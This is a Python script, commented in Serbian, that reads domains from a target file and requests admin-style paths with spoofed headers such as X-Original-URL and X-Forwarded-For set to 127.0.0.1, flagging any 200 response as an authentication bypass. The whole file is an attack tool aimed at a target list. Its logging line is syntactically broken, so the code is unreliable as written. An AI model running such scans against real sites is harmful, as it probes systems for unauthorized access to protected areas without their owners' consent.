import requests
from utils.log_utils import log_to_sheet, classify_severity

# Primeri zaštićenih putanja koje često zahtevaju autentifikaciju
PROTECTED_PATHS = [
    "/admin",
    "/dashboard",
    "/config",
    "/controlpanel",
    "/secret"
]

def check_auth_bypass(domain):
    headers_list = [
        {},  # Bez header-a
        {"X-Original-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Referer": "127.0.0.1"}
    ]

    for path in PROTECTED_PATHS:
        for headers in headers_list:
            url = f"{domain.rstrip('/')}{path}"
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code == 200:
                    msg = f"[!] Mogući AUTH BYPASS detektovan: {url} sa header-ima {headers}"
                    print(msg)
                    severity = classify_severity(msg)
                    log_to_sheet(__file__, msg) + f' | Severity: {{severity}}')
            except Exception as e:
                print(f"[-] Greška: {e}")

def run_auth_bypass():
    with open("targets/targets.txt", "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    for domain in targets:
        print(f"[~] Pokušaj AUTH BYPASS za: {domain}")
        check_auth_bypass(domain)

if __name__ == "__main__":
    run_auth_bypass()
